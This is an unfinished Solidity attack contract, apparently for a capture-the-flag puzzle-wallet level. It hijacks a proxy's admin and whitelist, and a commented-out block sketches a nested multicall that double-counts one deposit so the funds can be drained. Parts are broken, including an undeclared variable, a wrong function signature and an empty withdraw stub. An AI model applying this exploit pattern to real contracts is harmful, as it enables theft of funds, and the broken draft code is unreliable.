// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./24-puzzlewallet.sol";

contract Attack24 {
    PuzzleWallet public target;
    PuzzleProxy public proxy;
    address public owner;

    event AddedToWhiteList(address indexed _address);

    constructor(address payable _targetAddress) {
        owner = msg.sender;
        target = PuzzleWallet(_targetAddress);        
        proxy = PuzzleProxy(_targetAddress);
    }

    function attack() public {
        proxy.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
        emit AddedToWhiteList(address(this));

        // build deposit and multicall   <--  HERE

    /*
        
        bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
        
        bytes[] memory deposit_sig_in_array = new bytes[](1);
        
        deposit_sig_in_array[0] = deposit_sig;

        bytes memory multicall_sig = abi.encodeWithSignature(
            "multicall(bytes[])",
            deposit_sig_in_array
        );
        
        // bytes[] memory data = [deposit_sig, multicall_sig];
        bytes[] memory data = new bytes[](2);
        data[0] = deposit_sig;
        data[1] = multicall_sig;
        wallet.multicall{value: address(this).balance}(data);
        bytes memory transfer_sig = abi.encodeWithSignature(
            "transfer(int)",
            address(wallet).balance
        );

    */

        // target.execute();
        // target.setMaxBalance(); 
     }

    function withdraw() public view {
        require(owner == msg.sender, "not allowed, sorry");
        // withdraw all funds using a call()
    }
}


// function encodeCall(address -to, uint256 _amount) external pure returns (bytes memory) {
//     return abi.encodeCall(IERC20.transfer, (to, amount));
// }



